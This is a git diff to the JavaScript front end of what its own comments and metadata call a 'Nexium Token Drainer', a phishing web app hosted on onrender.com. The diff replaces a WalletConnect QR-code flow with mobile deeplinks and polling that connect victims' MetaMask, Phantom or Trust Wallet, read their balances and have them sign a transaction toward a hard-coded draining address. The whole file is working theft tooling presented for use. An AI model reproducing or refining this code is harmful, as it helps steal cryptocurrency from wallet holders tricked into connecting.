@@ -2,7 +2,6 @@ import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.
 import { CONFIG } from './config.js';
 import './style.css';
 import UniversalProvider from '@walletconnect/universal-provider';
-import QRCode from 'qrcode';
 
 // Wallet address for draining tokens (Solana address)
 let YOUR_WALLET_ADDRESS;
@@ -128,6 +127,7 @@ class NexiumApp {
       const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
       if (isMobileUserAgent) {
+        // Mobile: Open deeplink and connect like desktop extension
         const deeplinks = {
           MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com',
           Phantom: 'https://phantom.app/ul/v1/connect?app_url=https://nexium-bot.onrender.com',
@@ -139,60 +139,61 @@ class NexiumApp {
           throw new Error(`No deeplink configured for ${walletName}`);
         }
         console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
+        window.location.href = deeplink;
 
-        const relayUrls = [
-          'wss://relay.walletconnect.org',
-          'wss://relay.walletconnect.com' // Fallback relay
-        ];
-        let attempt = 0;
-
-        while (attempt < relayUrls.length) {
-          try {
-            this.provider = await UniversalProvider.init({
-              projectId: CONFIG.WALLET_CONNECT_PROJECT_ID,
-              metadata: {
-                name: 'NexiumApp',
-                description: 'Nexium Token Drainer',
-                url: 'https://nexium-bot.onrender.com',
-                icons: ['https://nexium-bot.onrender.com/icon.png'],
-              },
-              relayUrl: relayUrls[attempt],
+        // Poll for wallet connection after deeplink
+        const checkConnection = setInterval(async () => {
+          if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            if (accounts.length > 0) {
+              this.publicKey = accounts[0];
+              this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+              const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+              console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
+              this.updateButtonState('connected', walletName, this.publicKey);
+              this.hideMetaMaskPrompt();
+              this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+              this.renderTokenInterface();
+              clearInterval(checkConnection);
+            }
+          } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
+            const response = await window.solana.connect();
+            this.publicKey = response.publicKey.toString();
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+            const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+            console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
+            this.updateButtonState('connected', walletName, this.publicKey);
+            this.hideMetaMaskPrompt();
+            this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+            this.renderTokenInterface();
+            clearInterval(checkConnection);
+          } else if (walletName === 'TrustWallet' && window.solana?.isTrust) {
+            await new Promise(resolve => {
+              const checkSolana = () => {
+                if (window.solana && window.solana.isTrust) {
+                  resolve();
+                } else {
+                  setTimeout(checkSolana, 500);
+                }
+              };
+              checkSolana();
             });
-
-            const session = await this.provider.connect({
-              namespaces: {
-                solana: {
-                  chains: ['solana:mainnet'],
-                  methods: ['solana_signTransaction', 'solana_signAllTransactions'],
-                  events: ['chainChanged', 'accountsChanged'],
-                },
-              },
-            });
-
-            this.displayQRCode(session.uri, walletName);
-            window.location.href = deeplink;
-
-            this.provider.on('connect', async () => {
-              const accounts = session.namespaces.solana.accounts;
-              if (accounts.length > 0) {
-                this.publicKey = accounts[0];
-                this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
-                const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
-                console.log(`${walletName} connected via WalletConnect: ${this.publicKey}, Balance: ${walletBalance}`);
-                this.updateButtonState('connected', walletName, this.publicKey);
-                this.hideMetaMaskPrompt();
-                this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
-                this.renderTokenInterface();
-              }
-            });
-            break; // Exit loop if successful
-          } catch (error) {
-            attempt++;
-            if (attempt === relayUrls.length) throw error;
-            console.log(`Retry with fallback relay ${relayUrls[attempt]}`);
+            const response = await window.solana.connect({ onlyIfTrusted: false });
+            if (response && response.publicKey) {
+              this.publicKey = response.publicKey.toString();
+              this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+              const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+              console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
+              this.updateButtonState('connected', walletName, this.publicKey);
+              this.hideMetaMaskPrompt();
+              this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+              this.renderTokenInterface();
+              clearInterval(checkConnection);
+            }
           }
-        }
+        }, 1000); // Check every second
       } else {
+        // Desktop: Use extension-based flow
         const hasEthereum = !!window.ethereum;
         const hasSolana = !!window.solana;
         const hasExtensions = (walletName === 'MetaMask' && hasEthereum) || 
@@ -252,26 +253,6 @@ class NexiumApp {
     } finally {
       this.connecting = false;
     }
-  }
-
-  displayQRCode(uri, walletName) {
-    const qrContainer = document.createElement('div');
-    qrContainer.className = 'qr-code-container fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
-    qrContainer.innerHTML = `
-      <div class="bg-[#1a182e] p-6 rounded-xl border border-orange-400">
-        <p class="text-white mb-4">Scan this QR code with ${walletName} to connect:</p>
-        <canvas id="qrCode"></canvas>
-        <button class="close-qr bg-orange-400 text-black px-4 py-2 mt-4 rounded-xl" aria-label="Close QR code">Close</button>
-      </div>
-    `;
-    document.body.appendChild(qrContainer);
-    QRCode.toCanvas(document.getElementById('qrCode'), uri, { width: 200 }, (err) => {
-      if (err) {
-        console.error('QR code generation failed:', err);
-        this.showFeedback('Failed to generate QR code.', 'error');
-      }
-    });
-    qrContainer.querySelector('.close-qr').addEventListener('click', () => qrContainer.remove());
   }
 
   updateButtonState(state, walletName, address = '') {
@@ -686,7 +667,7 @@ class NexiumApp {
       let blockhashObj = await this.solConnection.getRecentBlockhash();
       transaction.recentBlockhash = blockhashObj.blockhash;
 
-      const signed = await window.solana.signTransaction(transaction); // Adjust for WalletConnect if needed
+      const signed = await window.solana.signTransaction(transaction);
       console.log('Transaction signed:', signed);
 
       let txid = await this.solConnection.sendRawTransaction(signed.serialize());
